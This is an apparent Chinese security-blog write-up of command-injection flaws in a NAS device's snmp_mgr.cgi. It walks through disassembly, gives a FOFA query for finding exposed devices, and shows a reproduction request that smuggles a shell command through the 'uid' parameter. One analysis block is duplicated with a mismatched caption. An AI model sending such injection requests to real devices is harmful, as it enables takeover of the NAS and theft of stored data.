---
title: "西部数码 NAS  snmp_mgr.cgi 多处命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-snmp_mgr-rce.html
asset_dir: assets/西部数码-nas-snmp_mgr.cgi-多处命令执行漏洞
---

# 西部数码 NAS snmp\_mgr.cgi 多处命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/31 12:08
* 444浏览
* [0评论](#comment)
* 3小时阅读

深入探索

编码转换工具

Web安全书籍

JSON处理工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

西部数码NAS（网络附加存储）是西部数码提供的存储解决方案，旨在为用户提供便捷的文件存储、备份和共享服务。

漏洞预警服务

西部数码NAS的`snmp_mgr.cgi`脚本存在多处[命令执行](https://mrxn.net/tag/rce)漏洞。该脚本在处理SNMP管理相关请求时，可能由于未对用户输入进行充分的过滤和验证，直接将用户提供的参数传递给系统命令执行函数或拼接进命令执行语句里。攻击者可以通过构造恶意的请求参数，注入操作系统命令，从而在服务器上[执行任意命令](https://mrxn.net/tag/rce)。

该漏洞可能导致攻击者完全控制NAS服务器，窃取存储在NAS上的敏感数据，篡改文件，植入恶意软件，甚至将NAS作为跳板攻击内网其他系统，对用户的数据安全和网络安全造成严重威胁。

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"

# 漏洞分析

深入探索

防火墙软件

漏洞扫描器

计算机安全

传参的逻辑在最上面也能看到

[![西部数码 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-001-dbe51375d634.webp)](https://image.mrxn.net/ef5ff561a98741f39c83bfeaa66e45f3.webp)

程序首先调用 `cgiFormString` 函数，从HTTP请求中获取一个名为 `cmd` 的参数值。这个值决定了接下来要执行什么操作。

代码安全审计

根据漏洞通告，使用IDA打开 snmp\_mgr.cgi 搜索 **cgi\_SNMPv3\_delete\_one\_record** 定位到它的处理逻辑处

[![西部数码 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-002-bd48228fe9c0.webp)](https://image.mrxn.net/882b18183247443280be12bad18785ae.webp)

程序通过一连串的 `strcmp` (字符串比较) 来判断 `cmd` 参数的值，并根据不同的值，跳转（`BL`指令）到不同的子函数执行相应的操作。

物流软件安全

深入探索

恶意软件分析工具

在线安全工具

漏洞扫描服务

## cgi\_SNMPv3\_delete\_one\_record

当**cmd=cgi\_SNMPv3\_delete\_one\_record** 时，跳转进入 **sub\_117E4** ，汇编处理逻辑如下

```
sub_117E4

var_48= -0x48

; __unwind {
PUSH            {LR}
SUB             SP, SP, #0x244
ADD             R1, SP, #0x248+var_48
MOV             R2, #0x40 ; '@'
LDR             R0, =aUid ; "uid"
BL              cgiFormString
ADD             R2, SP, #0x248+var_48
LDR             R1, =aSnmpToolRSDevN ; "snmp_tool -r \"%s\" >/dev/null 2>&1"
MOV             R0, SP  ; s
BL              sprintf
MOV             R0, SP  ; command
BL              system
LDR             R0, =command ; "snmp_tool -s >/dev/null 2>&1"
BL              system
LDR             R0, =aTextHtml ; "text/html"
BL              cgiHeaderContentType
ADD             SP, SP, #0x244
POP             {LR}
BX              LR
; End of function sub_117E4
```

到这就很清楚了，漏洞形成原因是直接将 uid 拼接进 snmp\_tool 命令工具的参数里面，从而导致的[命令注入漏洞](https://mrxn.net/tag/rce)。

## cgi\_get\_SNMPv3\_one\_record

存在同样漏洞的还有 cgi\_get\_SNMPv3\_one\_record（sub\_11178），汇编处理逻辑如下

安全运维咨询

```
sub_11178

var_28= -0x28
var_24= -0x24
var_20= -0x20
var_1C= -0x1C
var_18= -0x18
var_14= -0x14
var_10= -0x10
var_C= -0xC

; __unwind {
PUSH            {LR}
MOV             R3, #0
SUB             SP, SP, #0x224
MOV             R1, R3  ; c
MOV             R0, SP  ; s
MOV             R2, #0x200 ; n
STR             R3, [SP,#0x228+var_28]
STR             R3, [SP,#0x228+var_24]
STR             R3, [SP,#0x228+var_20]
STR             R3, [SP,#0x228+var_1C]
STR             R3, [SP,#0x228+var_18]
STR             R3, [SP,#0x228+var_14]
STR             R3, [SP,#0x228+var_10]
STR             R3, [SP,#0x228+var_C]
BL              memset
ADD             R1, SP, #0x228+var_28
MOV             R2, #0x20 ; ' '
LDR             R0, =aUid ; "uid"
BL              cgiFormString
ADD             R2, SP, #0x228+var_28
LDR             R1, =aSnmpToolUSDevN ; "snmp_tool -U \"%s\" >/dev/null 2>&1"
MOV             R0, SP  ; s
BL              sprintf
MOV             R0, SP  ; command
BL              system
LDR             R0, =aTextHtml ; "text/html"
BL              cgiHeaderContentType
ADD             SP, SP, #0x224
POP             {LR}
BX              LR
; End of function sub_11178
```

也是将 uid 直接拼接进 snmp\_tool 命令工具的参数里面，从而导致的[命令注入](https://mrxn.net/tag/rce)漏洞。

## cgi\_set\_SNMP\_v2

当cmd=cgi\_set\_SNMP\_v2 时，会跳转到 sub\_1150C ，其汇编处理如下

漏洞预警服务

```
sub_1150C

command= -0x348
s= -0x148
var_C8= -0xC8
var_48= -0x48
var_44= -0x44
var_40= -0x40
var_3C= -0x3C
var_38= -0x38
var_34= -0x34
var_30= -0x30
var_2C= -0x2C
var_28= -0x28
var_24= -0x24
var_20= -0x20
var_1C= -0x1C
var_18= -0x18
var_14= -0x14

; __unwind {
PUSH            {R4-R6,LR}
SUB             SP, SP, #0x730
SUB             SP, SP, #8
MOV             R4, #0
MOV             R6, #0x80
MOV             R1, R4  ; c
MOV             R2, R6  ; n
ADD             R0, SP, #0x748+s ; s
MOV             R5, #0x200
STR             R4, [SP,#0x748+var_28]
STR             R4, [SP,#0x748+var_24]
STR             R4, [SP,#0x748+var_20]
STR             R4, [SP,#0x748+var_1C]
STR             R4, [SP,#0x748+var_18]
STR             R4, [SP,#0x748+var_14]
BL              memset
MOV             R1, R4  ; c
MOV             R2, R6  ; n
ADD             R0, SP, #0x748+var_C8 ; s
BL              memset
MOV             R1, R4  ; c
MOV             R2, R5  ; n
MOV             R0, SP  ; s
BL              memset
MOV             R1, R4  ; c
MOV             R2, R5  ; n
ADD             R0, SP, R5 ; s
BL              memset
MOV             R1, R4  ; c
MOV             R2, R5  ; n
ADD             R0, SP, #0x748+command ; s
STR             R4, [SP,#0x748+var_48]
STR             R4, [SP,#0x748+var_44]
STR             R4, [SP,#0x748+var_40]
STR             R4, [SP,#0x748+var_3C]
STR             R4, [SP,#0x748+var_38]
STR             R4, [SP,#0x748+var_34]
STR             R4, [SP,#0x748+var_30]
STR             R4, [SP,#0x748+var_2C]
BL              memset
ADD             R1, SP, #0x748+var_28
MOV             R2, #8
LDR             R0, =aFEnable ; "f_enable"
BL              cgiFormString
ADD             R1, SP, #0x748+var_28
ADD             R1, R1, #8
MOV             R2, #8
LDR             R0, =aSnmpEnabledLev ; "snmp_enabled_level"
BL              cgiFormString
MOV             R1, SP
MOV             R2, R5
LDR             R0, =aSnmpSyslocatio ; "snmp_syslocation"
BL              cgiFormString
MOV             R2, R5
ADD             R1, SP, R5
LDR             R0, =aSnmpSyscontact ; "snmp_syscontact"
BL              cgiFormString
ADD             R1, SP, #0x748+s
MOV             R2, R6
LDR             R0, =aFCommunity ; "f_community"
BL              cgiFormString
MOV             R2, R6
ADD             R1, SP, #0x748+var_C8
LDR             R0, =aNotificationCo ; "notification_community"
BL              cgiFormString
ADD             R1, SP, #0x748+var_18
MOV             R2, #8
LDR             R0, =aNotificationEn ; "notification_enable"
BL              cgiFormString
ADD             R1, SP, #0x748+var_48
MOV             R2, #0x20 ; ' '
LDR             R0, =aIp ; "ip"
BL              cgiFormString
ADD             R2, SP, #0x748+var_28
LDR             R1, =aSnmpToolBSDevN ; "snmp_tool -B %s >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; s
BL              sprintf
ADD             R0, SP, #0x748+command ; command
BL              system
ADD             R2, SP, #0x748+var_28
ADD             R2, R2, #8
ADD             R0, SP, #0x748+command ; s
LDR             R1, =aSnmpToolBSDevN_0 ; "snmp_tool -b %s >/dev/null 2>&1"
BL              sprintf
ADD             R0, SP, #0x748+command ; command
BL              system
ADD             R0, SP, #0x748+s
BL              sub_11000
ADD             R2, SP, #0x748+s
LDR             R1, =aSnmpToolZSDevN ; "snmp_tool -Z \"%s\" >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; s
BL              sprintf
ADD             R0, SP, #0x748+command ; command
BL              system
MOV             R0, SP
BL              sub_11000
MOV             R2, SP
LDR             R1, =aSnmpToolLSDevN ; "snmp_tool -L \"%s\" >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; s
BL              sprintf
ADD             R0, SP, #0x748+command ; command
BL              system
ADD             R0, SP, R5
BL              sub_11000
ADD             R2, SP, R5
LDR             R1, =aSnmpToolCSDevN ; "snmp_tool -C \"%s\" >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; s
BL              sprintf
ADD             R0, SP, #0x748+command ; command
BL              system
ADD             R2, SP, #0x748+var_18
LDR             R1, =aSnmpToolESDevN ; "snmp_tool -E %s >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; s
BL              sprintf
ADD             R0, SP, #0x748+command ; command
BL              system
ADD             R0, SP, #0x748+var_C8
BL              sub_11000
ADD             R2, SP, #0x748+var_C8
ADD             R3, SP, #0x748+var_48
ADD             R0, SP, #0x748+command ; s
LDR             R1, =aSnmpToolOSOSDe ; "snmp_tool -o \"%s\" -O \"%s\" >/dev/nul"...
BL              sprintf
ADD             R0, SP, #0x748+command ; command
BL              system
LDR             R0, =command ; "snmp_tool -s >/dev/null 2>&1"
BL              system
LDR             R0, =aTextHtml ; "text/html"
BL              cgiHeaderContentType
ADD             SP, SP, #0x338
ADD             SP, SP, #0x400
POP             {R4-R6,LR}
BX              LR
; End of function sub_1150C
```

程序依次调用 `cgiFormString` 函数来获取HTTP请求中的多个参数值，并将它们存储到栈上的不同缓冲区中。

* `f_enable` (存入 `SP + 0x748 + var_28`，大小为8字节)
* `snmp_enabled_level` (存入 `SP + 0x748 + var_28 + 8`，大小为8字节)
* `snmp_syslocation` (存入 `SP`，大小为512字节)
* `snmp_syscontact` (存入 `SP + R5`，大小为512字节)
* `f_community` (存入 `SP + 0x748 + s`，大小为128字节)
* `notification_community` (存入 `SP + 0x748 + var_C8`，大小为128字节)
* `notification_enable` (存入 `SP + 0x748 + var_18`，大小为8字节)
* `ip` (存入 `SP + 0x748 + var_48`，大小为32字节)

在进行利用需要注意长度大小，可以选取大一点的如128或512字节的参数进行利用。

程序会多次使用 `sprintf` 和 `system` 来执行 `snmp_tool` 命令：

**设置** **SNMP** **启用状态 (**`-B`**)**:

```
ADD             R2, SP, #0x748+var_28  ; R2 指向 f_enable 参数的缓冲区
LDR             R1, =aSnmpToolBSDevN ; "snmp_tool -B %s >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

这里 `%s` 会被 `f_enable` 的值替换。

**设置** **SNMP** **启用级别 (**`-b`**)**:

```
ADD             R2, SP, #0x748+var_28  ; R2 指向 f_enable 参数的缓冲区
ADD             R2, R2, #8             ; 偏移8字节，指向 snmp_enabled_level 参数的缓冲区
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
LDR             R1, =aSnmpToolBSDevN_0 ; "snmp_tool -b %s >/dev/null 2>&1"
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

* 这里 `%s` 会被 `snmp_enabled_level` 的值替换。

**处理** `f_community` **参数**:

```
ADD             R0, SP, #0x748+s       ; R0 指向 f_community 参数的缓冲区
BL              sub_11000              ; 调用 sub_11000 处理 f_community
ADD             R2, SP, #0x748+s       ; R2 指向 f_community 参数的缓冲区
LDR             R1, =aSnmpToolZSDevN ; "snmp_tool -Z \"%s\" >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

这里 `%s` 会被 `f_community` 的值替换。请注意 `sub_11000` 会对 `\` 和 `"` 进行转义，但不会对 `;`, `|`, `&` 等shell元字符进行转义。

**处理** `snmp_syslocation` **参数**:

```
MOV             R0, SP                 ; R0 指向 snmp_syslocation 参数的缓冲区
BL              sub_11000              ; 调用 sub_11000 处理 snmp_syslocation
MOV             R2, SP                 ; R2 指向 snmp_syslocation 参数的缓冲区
LDR             R1, =aSnmpToolLSDevN ; "snmp_tool -L \"%s\" >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

这里 `%s` 会被 `snmp_syslocation` 的值替换。

**处理** `snmp_syscontact` **参数**:

```
ADD             R0, SP, R5             ; R0 指向 snmp_syscontact 参数的缓冲区
BL              sub_11000              ; 调用 sub_11000 处理 snmp_syscontact
ADD             R2, SP, R5             ; R2 指向 snmp_syscontact 参数的缓冲区
LDR             R1, =aSnmpToolCSDevN ; "snmp_tool -C \"%s\" >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

这里 `%s` 会被 `snmp_syscontact` 的值替换。

**处理** `notification_enable` **参数**:

```
ADD             R2, SP, #0x748+var_18  ; R2 指向 notification_enable 参数的缓冲区
LDR             R1, =aSnmpToolESDevN ; "snmp_tool -E %s >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

这里 `%s` 会被 `notification_enable` 的值替换。

**处理** `notification_community` **和** `ip` **参数**:

```
ADD             R0, SP, #0x748+var_C8  ; R0 指向 notification_community 参数的缓冲区
BL              sub_11000              ; 调用 sub_11000 处理 notification_community
ADD             R2, SP, #0x748+var_C8  ; R2 指向 notification_community 参数的缓冲区
ADD             R3, SP, #0x748+var_48  ; R3 指向 ip 参数的缓冲区
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
LDR             R1, =aSnmpToolOSOSDe ; "snmp_tool -o \"%s\" -O \"%s\" >/dev/nul"...
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

这里 `%s` 会被 `notification_enable` 的值替换。

**处理** `notification_community` **和** `ip` **参数**:

```
ADD             R0, SP, #0x748+var_C8  ; R0 指向 notification_community 参数的缓冲区
BL              sub_11000              ; 调用 sub_11000 处理 notification_community
ADD             R2, SP, #0x748+var_C8  ; R2 指向 notification_community 参数的缓冲区
ADD             R3, SP, #0x748+var_48  ; R3 指向 ip 参数的缓冲区
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
LDR             R1, =aSnmpToolOSOSDe ; "snmp_tool -o \"%s\" -O \"%s\" >/dev/nul"...
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

这里 `%s` 会分别被 `notification_community` 和 `ip` 的值替换。

**重新启动** **SNMP** **服务**:

```
LDR             R0, =command ; "snmp_tool -s >/dev/null 2>&1"
BL              system       ; 执行命令
```

这是一个硬编码的命令，用于重启SNMP服务。

根据缓冲区大小，当前逻辑下，各个参数的缓冲区大小以及是否可利用如下表

[![西部数码 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-003-78c1dd9dc6b3.webp)](https://image.mrxn.net/968663084d8a4f5ebcec8ac7aee58dc2.webp)

## cgi\_set\_SNMPv3\_one\_record

```
解释下下面的汇编代码
sub_111FC

var_88C= -0x88C
var_888= -0x888
var_884= -0x884
var_880= -0x880
var_87C= -0x87C
var_870= -0x870
var_670= -0x670
var_46C= -0x46C
var_27C= -0x27C
var_7C= -0x7C
var_3C= -0x3C
var_1C= -0x1C
nptr= -0xC
var_8= -8

; __unwind {
PUSH            {R4-R8,R10,LR}
SUB             SP, SP, #0x880
SUB             SP, SP, #0xC
MOV             R5, #0
ADD             R1, SP, #0x88C+nptr
MOV             R2, #8
ADD             R7, SP, #0x860
LDR             R0, =aDataLen ; "data_len"
ADD             R6, SP, #0x88C+var_670
STR             R5, [SP,#0x88C+nptr]
ADD             R8, SP, #0x88C+var_1C
STR             R5, [SP,#0x88C+var_8]
BL              cgiFormString
MOV             R1, R5  ; endptr
MOV             R2, #0xA ; base
ADD             R0, SP, #0x88C+nptr ; nptr
ADD             R10, SP, #0x88C+var_7C
BL              strtol
ADD             R10, R10, #0xC
ADD             R0, R0, #1 ; size
BL              malloc
MOV             R1, R5  ; endptr
MOV             R2, #0xA ; base
MOV             R4, R0
ADD             R0, SP, #0x88C+nptr ; nptr
BL              strtol
MOV             R1, R4
ADD             R2, R0, #1
LDR             R0, =aData ; "data"
BL              cgiFormString
ADD             R2, SP, #0x88C+var_870
MOV             R0, R4
MOV             R1, #1
BL              sub_10F34
MOV             R0, R4
ADD             R2, SP, #0x88C+var_3C
MOV             R1, #2
BL              sub_10F34
MOV             R0, R4
MOV             R2, R7
MOV             R1, #3
BL              sub_10F34
MOV             R0, R4
MOV             R2, R6
MOV             R1, #4
BL              sub_10F34
MOV             R0, R4
MOV             R2, R8
MOV             R1, #5
BL              sub_10F34
ADD             R3, SP, #0x88C+var_46C
ADD             R3, R3, #8
MOV             R0, R4
SUB             R5, R3, #0xC
MOV             R1, #6
MOV             R2, R5
BL              sub_10F34
MOV             R2, R10
MOV             R1, #7
MOV             R0, R4
BL              sub_10F34
MOV             R0, R6
BL              sub_11000
MOV             R0, R5
BL              sub_11000
ADD             R0, SP, #0x88C+var_27C
ADD             R2, SP, #0x88C+var_870
ADD             R3, SP, #0x88C+var_3C
LDR             R1, =aSnmpToolV3USLS ; "snmp_tool -v 3 -u \"%s\" -l \"%s\" -a "...
ADD             R0, R0, #0xC ; s
STR             R7, [SP,#0x88C+var_88C]
STR             R6, [SP,#0x88C+var_888]
STR             R5, [SP,#0x88C+var_880]
STR             R8, [SP,#0x88C+var_884]
STR             R10, [SP,#0x88C+var_87C]
BL              sprintf
ADD             R0, SP, #0x88C+var_27C
ADD             R0, R0, #0xC ; command
BL              system
LDR             R0, =command ; "snmp_tool -s >/dev/null 2>&1"
BL              system
MOV             R0, R4  ; ptr
BL              free
LDR             R0, =aTextHtml ; "text/html"
BL              cgiHeaderContentType
ADD             SP, SP, #0x8C
ADD             SP, SP, #0x800
POP             {R4-R8,R10,LR}
BX              LR
; End of function sub_111FC
```

此函数的功能是接收一个包含多项配置的XML-like数据块，解析它，然后用解析出的值构造一个复杂的命令行来配置SNMPv3用户。与之前分析的函数类似，这个函数也存在**极其严重的[命令注入](https://mrxn.net/tag/rce)漏洞**，因为解析出的用户数据在未经充分过滤的情况下被直接拼接到 `system()` 调用中。

漏洞预警服务

**详细执行流程**

1. **初始化与**内存分配 (Initialization and**Memory Allocation)**:
   1. 函数在栈上分配了 `0x88C` (约2.2KB) 的巨大空间。
   2. `cgiFormString` 首先获取 `data_len` 参数，这个参数指明了后续 `data` 参数的长度。
   3. 程序使用 `strtol` 将 `data_len` 转换为数字，然后调用 `malloc` 分配一块大小为 `data_len + 1` 的堆内存。这块内存（指针存在 `R4`）将用于存储 `data` 参数的内容。
   4. 接着，程序调用 `cgiFormString` 将 `data` 参数的内容读入刚刚分配的堆内存中。
2. **数据解析 (Data Parsing)**: 这是该函数的核心部分。程序假设 `data` 参数是一个包含多个字段的结构化字符串（可能是简化的XML或类似格式）。它通过**多次调用** `sub_10F34` **函数**来解析出各个字段的值。
   1. `sub_10F34` **的作用**: 这个子函数 `sub_10F34(char *data_blob, int field_index, char *output_buffer)` 的功能是从输入的 `data_blob` 中，根据 `field_index`（字段索引，如1, 2, 3...）提取出第 N 个 `<cell>` 标签内的内容，并将其复制到 `output_buffer` 中。
   2. **解析过程**:
      * `sub_10F34(R4, 1, ...)`: 解析第1个字段，存入 `[SP+0x88C+var_870]`。
      * `sub_10F34(R4, 2, ...)`: 解析第2个字段，存入 `[SP+0x88C+var_3C]`。
      * ...依此类推，一共解析了7个字段，分别存放在栈上的不同缓冲区中。
3. **不充分的过滤 (Insufficient Filtering)**:
   1. `MOV R0, R6` / `BL sub_11000`: 对第4个解析出的字段（存放在 `R6` 指向的缓冲区）调用 `sub_11000` 进行过滤。
   2. `MOV R0, R5` / `BL sub_11000`: 对第6个解析出的字段（存放在 `R5` 指向的缓冲区）调用 `sub_11000` 进行过滤。
   3. **关键缺陷**: 正如之前分析，`sub_11000` 函数的过滤机制是无效的，它无法阻止命令注入。**更重要的是，其他5个解析出的字段完全没有经过任何过滤！**
4. **构造并执行命令 (Command Construction and Execution)**:
   1. `sprintf`: 程序使用 `sprintf` 将所有7个解析出的字段值拼接到一个非常长的命令行格式字符串 `aSnmpToolV3USLS` 中。
   2. `"snmp_tool -v 3 -u \"%s\" -l \"%s\" -a \"%s\" -A \"%s\" -x \"%s\" -X \"%s\" -V \"%s\" >/dev/null 2>&1"`
   3. 这里的 `%s` 占位符会被依次替换为从 `data` 参数中解析出的7个字段的值。
   4. `system()`: 拼接好的命令字符串被传递给 `system()` 执行。
5. **收尾工作**:
   1. 执行 `snmp_tool -s` 命令来保存设置。
   2. 调用 `free(R4)` 释放之前为 `data` 分配的堆内存。
   3. 返回HTTP响应头。

## cgi\_SNMPv3\_modify\_one\_record

和上面的一样的逻辑

[![西部数码 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-004-9010c4a1122a.webp)](https://image.mrxn.net/94d66e38d9e74629832c0f48531e5fcf.webp)

# 漏洞复现

## cgi\_SNMPv3\_delete\_one\_record

```
GET /cgi-bin/snmp_mgr.cgi?cmd=cgi_SNMPv3_delete_one_record&uid=%24(touch%20/var/www/t.png) HTTP/1.1
Host: west-nas.mrxn.net
```

[![西部数码 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-005-2168c313e2b0.webp)](https://image.mrxn.net/1be9b131f505401b8829952bc3eb5819.webp)

访问生成的文件，成功创建

## cgi\_set\_SNMP\_v2

[![西部数码 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-006-e9d612b9b11b.webp)](https://image.mrxn.net/e0471665c71a4657b1b2712a94497532.webp)

[![西部数码 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-007-b45396291770.webp)](https://image.mrxn.net/ff40b02966224e9283a236f17d69d70e.webp)

成功执行命令

## cgi\_SNMPv3\_modify\_one\_record

[![西部数码 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-008-dadfe259625d.webp)](https://image.mrxn.net/02b70da65e9c4abb9a000497703fa8e7.webp)

[![西部数码 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-009-3a9f55c2ccd6.webp)](https://image.mrxn.net/fd61103b4aa844dca666a0a2d39c4086.webp)

## cgi\_set\_SNMPv3\_one\_record

[![西部数码 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-010-86f864655f61.webp)](https://image.mrxn.net/69c27c781ba34ee28a542ee7e802d5bc.webp)

[![西部数码 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-011-865f035732eb.webp)](https://image.mrxn.net/113636b503974738980cf7d1f03f91fb.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [4.1.cgi\_SNMPv3\_delete\_one\_record](#toc-4-1-)
* [4.2.cgi\_get\_SNMPv3\_one\_record](#toc-4-2-)
* [4.3.cgi\_set\_SNMP\_v2](#toc-4-3-)
* [4.4.cgi\_set\_SNMPv3\_one\_record](#toc-4-4-)
* [4.5.cgi\_SNMPv3\_modify\_one\_record](#toc-4-5-)
* [5.漏洞复现](#toc-5-)
* [5.1.cgi\_SNMPv3\_delete\_one\_record](#toc-5-1-)
* [5.2.cgi\_set\_SNMP\_v2](#toc-5-2-)
* [5.3.cgi\_SNMPv3\_modify\_one\_record](#toc-5-3-)
* [5.4.cgi\_set\_SNMPv3\_one\_record](#toc-5-4-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
